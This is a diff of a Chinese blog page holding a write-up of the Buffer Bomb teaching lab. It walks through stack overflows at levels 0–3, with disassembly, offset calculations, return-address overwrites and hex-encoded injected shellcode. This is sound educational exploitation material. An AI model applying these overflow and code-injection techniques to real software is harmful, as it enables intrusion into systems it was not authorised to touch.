@@ -19,15 +19,15 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0   Level 0: Candle要求在getbuf执行返回语句之前调用smoke函数，我们考虑利用缓冲区溢出的漏洞来修改getbuf函数的返回地址 12345678910111">
+  <meta name="description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0">
 <meta property="og:type" content="article">
 <meta property="og:title" content="the Buffer Bomb">
 <meta property="og:url" content="http://example.com/2021/12/25/bufbomb/index.html">
 <meta property="og:site_name" content="Existo&#39;s Blog">
-<meta property="og:description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0   Level 0: Candle要求在getbuf执行返回语句之前调用smoke函数，我们考虑利用缓冲区溢出的漏洞来修改getbuf函数的返回地址 12345678910111">
+<meta property="og:description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png">
 <meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png">
@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631621.png">
 <meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png">
 <meta property="article:published_time" content="2021-12-25T08:10:08.000Z">
-<meta property="article:modified_time" content="2021-12-26T08:31:50.383Z">
+<meta property="article:modified_time" content="2022-01-18T15:00:05.985Z">
 <meta property="article:author" content="Existo">
 <meta property="article:tag" content="汇编语言">
 <meta name="twitter:card" content="summary">
@@ -167,10 +167,9 @@
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/ExistoT01" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
 
 
     <main class="main">
@@ -215,7 +214,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-26 16:31:50" itemprop="dateModified" datetime="2021-12-26T16:31:50+08:00">2021-12-26</time>
+                <time title="修改时间：2022-01-18 23:00:05" itemprop="dateModified" datetime="2022-01-18T23:00:05+08:00">2022-01-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -228,6 +227,13 @@
             </span>
 
           
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
 
         </div>
       </header>
@@ -243,15 +249,16 @@
 <p><code>objdump -d bufbomb &gt; asm.txt</code></p>
 </li>
 <li><p>获取自己的<code>cookie</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Userid: existo</span><br><span class="line">Cookie: 0x73413ee0</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Userid</span>: existo</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">73413</span>ee<span class="number">0</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
+<span id="more"></span>
 <h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>要求在<code>getbuf</code>执行返回语句之前调用<code>smoke</code>函数，我们考虑利用缓冲区溢出的漏洞来修改<code>getbuf</code>函数的返回地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
 <p>观察汇编指令，发现分配给字符串的空间是从<code>%ebp - 0x32</code>开始的，<code>0x32</code>也就是<code>50</code>个字节，返回地址在<code>%ebp + 0x4</code>处，而<code>push %ebp</code>又占用<code>4</code>个字节，因此整个结构便有<code>0x32 + 0x4 + 0x4</code>一共<code>58</code>个字节，我们要做的是，将<code>smoke</code>函数的开始地址覆盖<code>getbuf</code>的最后<code>4</code>个字节的返回地址，这样执行完<code>getbuf</code>函数后就会跳转到我们想要的位置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048ba1 &lt;smoke&gt;:</span><br><span class="line"> 8048ba1:	55                   	push   %ebp</span><br><span class="line"> 8048ba2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba4:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ba7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048baa:	68 30 a3 04 08       	push   $0x804a330</span><br><span class="line"> 8048baf:	e8 5c fd ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048bb4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bb7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bba:	6a 00                	push   $0x0</span><br><span class="line"> 8048bbc:	e8 fe 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bc4:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc7:	6a 00                	push   $0x0</span><br><span class="line"> 8048bc9:	e8 52 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
 <p>观察到<code>smoke</code>函数的起始地址为<code>0x08048ba1</code>，因此我们将前<code>58 - 4 = 54</code>字节用任意值填满即可，最后<code>4</code>字节放上我们的<code>0x08048ba1</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*level 0*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">a1 8b 04 08</span><br></pre></td></tr></table></figure>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*level 0*/</span><br><span class="line">00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>/*54个任意值*/</span><br><span class="line">a1 8b<span class="number"> 04 </span>08</span><br></pre></td></tr></table></figure>
 <p>储存为<code>level0.txt</code>文件，再使用提供的<code>hex2raw</code>程序转化为题目需要的<code>string</code></p>
 <p><code>./hex2raw &lt; level0.txt &gt; level0-raw.txt</code></p>
 <p>之后的题目都是这个办法，因此不再赘述(除了<code>level4</code>需要加<code>-n</code>)</p>
@@ -260,7 +267,7 @@
 <h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>要求和<code>level 0</code>类似，只不过这次要调用<code>fizz</code>函数，<code>fizz</code>函数需要输入一个参数，要求此参数是我们每个人独有的<code>cookie</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048bce &lt;fizz&gt;:</span><br><span class="line"> 8048bce:	55                   	push   %ebp</span><br><span class="line"> 8048bcf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bd1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bd4:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bd7:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048bdc:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bde:	75 22                	jne    8048c02 &lt;fizz+0x34&gt;</span><br><span class="line"> 8048be0:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048be3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048be6:	68 4b a3 04 08       	push   $0x804a34b</span><br><span class="line"> 8048beb:	e8 50 fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048bf0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bf3:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bf6:	6a 01                	push   $0x1</span><br><span class="line"> 8048bf8:	e8 c2 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bfd:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c00:	eb 13                	jmp    8048c15 &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c02:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c05:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c08:	68 6c a3 04 08       	push   $0x804a36c</span><br><span class="line"> 8048c0d:	e8 2e fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c12:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c15:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c18:	6a 00                	push   $0x0</span><br><span class="line"> 8048c1a:	e8 01 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
 <p>可以观察到<code>fizz</code>函数的起始地址<code>0x08048bce</code>，与<code>level 0</code>相似我们首先还是需要覆盖<code>getbuf</code>的返回地址为<code>0x08048bce</code>，先保证调用<code>fizz</code>函数，<code>fizz</code>函数中将参数放在<code>0x8(%ebp)</code>位置，此<code>%ebp</code>为新<code>ebp</code>，既是<code>getbuf</code>返回地址处新<code>push</code>的<code>%ebp</code>，因此我们需要将<code>cookie</code>放在新<code>%ebp+0x8</code>位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*level 1*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">ce 8b 04 08 /*fizz地址*/</span><br><span class="line">00 00 00 00 /*%ebp+0x4*/</span><br><span class="line">e0 3e 41 73 /*%ebp+0x8处放cookie*/</span><br></pre></td></tr></table></figure>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*level 1*/</span><br><span class="line">00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span></span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>/*54个任意值*/</span><br><span class="line">ce 8b<span class="number"> 04 </span>08 /*fizz地址*/</span><br><span class="line">00<span class="number"> 00 </span>00<span class="number"> 00 </span>/*%ebp+0x4*/</span><br><span class="line">e0 3e<span class="number"> 41 </span>73 /*%ebp+0x8处放cookie*/</span><br></pre></td></tr></table></figure>
 <p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png" alt="image-20211225170427364" style="zoom:80%;" /></p>
 <p><code>level 1</code>得解</p>
 <h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>任务要求仍然是在<code>getbuf</code>执行返回语句之前调用其他函数，这次调用<code>bang</code>函数，并且要求将<code>global_value</code>设置成自己的<code>cookie</code></p>
@@ -283,7 +290,7 @@
 <p>我们看到再调用<code>Gets</code>函数之前<code>push</code>了<code>%eax</code>，那么这个<code>%eax</code>就是字符串的首地址，也就是我们函数的起始地址，于是我们只要在调用<code>Gets</code>前设置一个断点，然后检查<code>%eax</code>的值即可</p>
 <p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631619.png" alt="image-20211225173935811"></p>
 <p>所以我们<code>%eax</code>的值为<code>0x55682f5e</code>，既是我们函数的起始地址，覆盖<code>getbuf</code>的返回地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c7 05 40 d1 04 08 e0 </span><br><span class="line">3e 41 73 </span><br><span class="line">68 1f 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c7</span> <span class="number">05</span> <span class="number">40</span> d<span class="number">1</span> <span class="number">04</span> <span class="number">08</span> e<span class="number">0</span> </span><br><span class="line"><span class="attribute">3e</span> <span class="number">41</span> <span class="number">73</span> </span><br><span class="line"><span class="attribute">68</span> <span class="number">1</span>f <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> </span><br><span class="line"><span class="attribute">c3</span> /*函数代码*/</span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">5e</span> <span class="number">2</span>f <span class="number">68</span> <span class="number">55</span>/*%eax地址*/</span><br></pre></td></tr></table></figure>
 <p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631620.png" alt="image-20211225175046375" style="zoom:80%;" /></p>
 <p><code>level 2</code>得解</p>
 <h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>任务要求正常调用<code>getbuf</code>，但是修改<code>getbuf</code>的返回值为我们的<code>cookie</code>(原本为<code>1</code>)，同时要求栈空间被还原，既复原<code>saved ebp</code></p>
@@ -299,7 +306,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, %eax</span><br><span class="line">movl $0x55682fb0, %ebp</span><br><span class="line">push $0x8048c8d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 e0 3e 41 73       	mov    $0x73413ee0,%eax</span><br><span class="line">   5:	bd b0 2f 68 55       	mov    $0x55682fb0,%ebp</span><br><span class="line">   a:	68 8d 8c 04 08       	push   $0x8048c8d</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
 <p>接着步骤和之前相同</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b8 e0 3e 41 73 </span><br><span class="line">bd b0 2f 68 55 </span><br><span class="line">68 8d 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b8</span> e<span class="number">0</span> <span class="number">3</span>e <span class="number">41</span> <span class="number">73</span> </span><br><span class="line"><span class="attribute">bd</span> b<span class="number">0</span> <span class="number">2</span>f <span class="number">68</span> <span class="number">55</span> </span><br><span class="line"><span class="attribute">68</span> <span class="number">8</span>d <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> </span><br><span class="line"><span class="attribute">c3</span> /*函数代码*/</span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">5e</span> <span class="number">2</span>f <span class="number">68</span> <span class="number">55</span>/*%eax地址*/</span><br></pre></td></tr></table></figure>
 <p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png" alt="image-20211225181341091" style="zoom:80%;" /></p>
 
     </div>
@@ -307,10 +314,31 @@
     
     
     
+        <div class="reward-container">
+  <div>谨防新型互联网乞丐</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Existo 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Existo 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
 
       <footer class="post-footer">
+          
           <div class="post-tags">
-              <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" rel="tag"># 汇编语言</a>
+              <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" rel="tag"><i class="fa fa-tag"></i> 汇编语言</a>
           </div>
 
         
@@ -405,7 +433,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -430,11 +458,30 @@
       <span class="links-of-author-item">
         <a href="mailto:1x6tot01@gmail.com" title="E-Mail → mailto:1x6tot01@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/FLATUBM" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;FLATUBM" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/profile.php?id=100041581604369" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100041581604369" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.youtube.com/channel/UCUvhZ-R8l3ydxTZbYlupxRQ" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCUvhZ-R8l3ydxTZbYlupxRQ" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+      <span class="links-of-author-item">
